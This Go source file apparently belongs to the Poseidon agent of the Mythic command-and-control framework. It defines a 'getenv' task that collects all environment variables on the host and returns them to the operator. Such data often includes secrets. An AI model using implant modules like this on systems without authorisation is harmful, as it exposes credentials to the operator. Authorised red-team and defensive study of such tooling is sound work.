package getenv

import (
	// Standard
	"os"
	"sort"
	"strings"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/tasks/library"
)

func init() {
	library.RegisterTask("getenv", Run)
}

// Run - Function that executes the shell command
func Run(task structs.Task) {
	msg := task.NewResponse()
	envString := os.Environ()
	sort.Strings(envString)
	msg.UserOutput = strings.Join(envString, "\n")
	msg.Completed = true
	task.Job.SendResponses <- msg
	return
}
